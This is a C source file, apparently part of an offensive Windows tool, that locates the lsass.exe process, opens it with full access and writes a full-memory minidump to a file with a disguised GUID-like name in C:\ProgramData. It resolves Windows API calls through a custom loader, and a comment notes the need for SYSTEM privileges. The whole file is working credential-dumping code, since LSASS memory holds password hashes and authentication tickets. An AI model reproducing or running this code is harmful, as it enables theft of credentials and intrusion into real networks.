#include <windows.h>
#include <DbgHelp.h>
#include <TlHelp32.h>
#include <stdio.h>
#pragma comment(lib, "DbgHelp.lib")

#include "LoadAPI.h"
#include "DebugFunc.h"

DWORD getPid(Kernel32_API Kernel32Api) {
	
	DWORD lsassPID = 0;
	HANDLE snapshot = Kernel32Api.CreateToolhelp32SnapshotF(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 processEntry;
	processEntry.dwSize = sizeof(PROCESSENTRY32);
	char* processName;

	if (Kernel32Api.Process32FirstF(snapshot, &processEntry)) {
		
		processName = processEntry.szExeFile;
		lsassPID = processEntry.th32ProcessID;
		while (strcmp(processName, "lsass.exe") != 0) {
			Kernel32Api.Process32NextF(snapshot, &processEntry);
			processName = processEntry.szExeFile;
			lsassPID = processEntry.th32ProcessID;
		}
		PrintDebug("[+] Got lsass.exe PID: %i\n", lsassPID);
	}
	Kernel32Api.CloseHandleF(snapshot);
	return lsassPID;
}


BOOL DumpLsass(API_Call APICall) {
	HANDLE outFile;
	HANDLE lsassHandle = NULL;
	char* dmpFilePath = "C:\\ProgramData\\23E8BC3FE-A258-CF1F-FDD0-F5B3ECFC7A6";
	// get system priv !!!!
	Kernel32_API Kernel32Api = APICall.Kernel32Api;

	DWORD lsassPID = getPid(Kernel32Api);
	if (lsassPID == 0) {
		return FALSE;
	}

	lsassHandle = Kernel32Api.OpenProcessF(PROCESS_ALL_ACCESS, 0, lsassPID);
	if (lsassHandle == INVALID_HANDLE_VALUE) {
		PrintDebug("[X] Fail to open process %i!\n", GetLastError());
		PauseDebug();
		return FALSE;
	}

	outFile = Kernel32Api.CreateFileAF(dmpFilePath, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (outFile == INVALID_HANDLE_VALUE) {
		PrintDebug("[X] Fail to create file %i !\n", GetLastError());
		PauseDebug();
		return FALSE;
	}

#if _DEBUG
	printf("[-] Program Privilege:\n\t[+] ");
	system("whoami");
#endif

	if (MiniDumpWriteDump(lsassHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL)) {
		Kernel32Api.CloseHandleF(outFile);
		Kernel32Api.CloseHandleF(lsassHandle);
		return TRUE;
	}
	Kernel32Api.CloseHandleF(outFile);
	Kernel32Api.CloseHandleF(lsassHandle);
	return FALSE;
}

